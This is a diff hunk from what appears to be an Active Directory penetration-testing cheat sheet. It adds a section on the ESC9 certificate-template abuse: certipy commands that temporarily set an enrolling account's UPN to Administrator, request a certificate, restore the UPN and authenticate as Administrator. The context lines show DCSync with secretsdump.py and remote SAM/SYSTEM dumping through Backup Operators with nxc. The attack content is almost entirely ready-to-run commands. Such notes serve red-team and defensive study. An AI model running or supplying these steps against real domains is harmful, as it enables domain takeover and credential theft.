@@ -128,6 +128,15 @@ certipy auth -pfx <dc-host>.pfx -dc-ip <DC_IP>                     # -> DC$ mach
 secretsdump.py '<domain>/<dc-host>$'@<DC_FQDN> -hashes :<HASH>     # DCSync
 ```
 
+ESC9 (no security extension on the cert template) — combine with a GenericWrite you hold over some other enrolling account: temporarily change that account's UPN to the target, request a cert, then restore the UPN. The resulting cert has no `szOID_NTDS_CA_SECURITY_EXT`, so the KDC maps it purely by UPN at auth time:
+```bash
+certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -vulnerable       # look for "ESC9": "... template has no security extension"
+certipy account update -u <USER>@<domain> -p '<PASS>' -user <enrolling-account> -upn Administrator
+certipy req -u <enrolling-account>@<domain> -p '<its-pass>' -ca <CA_NAME> -template <vulnerable-template>   # -> administrator.pfx
+certipy account update -u <USER>@<domain> -p '<PASS>' -user <enrolling-account> -upn <enrolling-account>@<domain>   # restore UPN after
+certipy auth -pfx administrator.pfx -domain <domain>
+```
+
 Backup Operators group membership — this group can remotely dump SAM/SYSTEM registry hives without ever getting an interactive session:
 ```bash
 nxc smb <target> -u <USER> -H '<hash>' -M backup_operator    # drives the remote backup+download for you
